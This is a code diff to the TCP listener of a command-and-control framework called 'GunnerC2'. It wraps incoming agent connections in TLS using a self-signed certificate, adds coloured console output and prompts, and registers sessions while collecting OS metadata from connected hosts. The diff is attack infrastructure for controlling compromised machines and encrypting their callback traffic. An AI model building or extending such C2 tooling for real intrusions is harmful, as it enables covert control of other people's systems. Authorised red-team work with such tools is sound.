@@ -1,5 +1,61 @@
 import socket
 from core import session_manager, utils
+import os,sys,subprocess
+import ssl
+from cryptography import x509
+from cryptography.x509.oid import NameOID
+from cryptography.hazmat.primitives import serialization, hashes
+from cryptography.hazmat.primitives.asymmetric import rsa
+import datetime
+import tempfile
+
+from colorama import init, Fore, Style
+brightgreen = Style.BRIGHT + Fore.GREEN
+brightyellow = Style.BRIGHT + Fore.YELLOW
+brightred = Style.BRIGHT + Fore.RED
+brightblue = Style.BRIGHT + Fore.BLUE
+
+PROMPT = brightblue + "GunnerC2 > "
+
+
+def generate_tls_context():
+    key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
+
+    subject = issuer = x509.Name([
+        x509.NameAttribute(NameOID.COMMON_NAME, u"GunnerC2")
+    ])
+
+    cert = (
+        x509.CertificateBuilder()
+        .subject_name(subject)
+        .issuer_name(issuer)
+        .public_key(key.public_key())
+        .serial_number(x509.random_serial_number())
+        .not_valid_before(datetime.datetime.utcnow())
+        .not_valid_after(datetime.datetime.utcnow() + datetime.timedelta(days=365))
+        .sign(key, hashes.SHA256())
+    )
+
+    key_bytes = key.private_bytes(
+        encoding=serialization.Encoding.PEM,
+        format=serialization.PrivateFormat.TraditionalOpenSSL,
+        encryption_algorithm=serialization.NoEncryption()
+    )
+
+    cert_bytes = cert.public_bytes(serialization.Encoding.PEM)
+
+    # Write to temporary files
+    key_file = tempfile.NamedTemporaryFile(delete=False)
+    cert_file = tempfile.NamedTemporaryFile(delete=False)
+    key_file.write(key_bytes)
+    cert_file.write(cert_bytes)
+    key_file.close()
+    cert_file.close()
+
+    # Load into SSL context
+    context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
+    context.load_cert_chain(certfile=cert_file.name, keyfile=key_file.name)
+    return context
 
 def collect_tcp_metadata(sid):
     session = session_manager.sessions[sid]
@@ -46,27 +102,37 @@ def collect_tcp_metadata(sid):
                 session.metadata[field] = result_cleaned
 
             except Exception as e:
-                print(f"[!] Metadata collection failed for {sid} (field: {field}): {e}")
+                print(brightred + f"[!] Metadata collection failed for {sid} (field: {field}): {e}")
                 session.metadata[field] = "Error"
 
     except Exception as e:
-        print(f"[!] OS detection failed for {sid}: {e}")
+        print(brightred + f"[!] OS detection failed for {sid}: {e}")
         session.metadata["os"] = "Unknown"
 
 def start_tcp_listener(ip, port):
-    print(f"[+] TCP listener started on {ip}:{port}")
+    print(brightyellow + f"[+] TCP listener started on {ip}:{port}")
+    context = generate_tls_context()
     server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server_socket.bind((ip, port))
     server_socket.listen(5)
     utils.tcp_listener_sockets[f"tcp-{ip}:{port}"] = server_socket
 
     while True:
-        client_socket, addr = server_socket.accept()
+        raw_client, addr = server_socket.accept()
+
+        try:
+            client_socket = context.wrap_socket(raw_client, server_side=True)
+
+        except Exception as e:
+            print(brightred + f"[-] TLS handshake failed from {addr}: {e}")
+            continue
 
         sid = utils.gen_session_id()
         session_manager.register_tcp_session(sid, client_socket)
 
-        print(f"\n[+] New TCP agent: {sid}")
+        print(brightgreen + f"\n[+] New TCP agent: {sid}\n")
+        sys.stdout.write(PROMPT)
+        sys.stdout.flush()
 
         # DRAIN BANNER (important!)
         client_socket.settimeout(0.5)
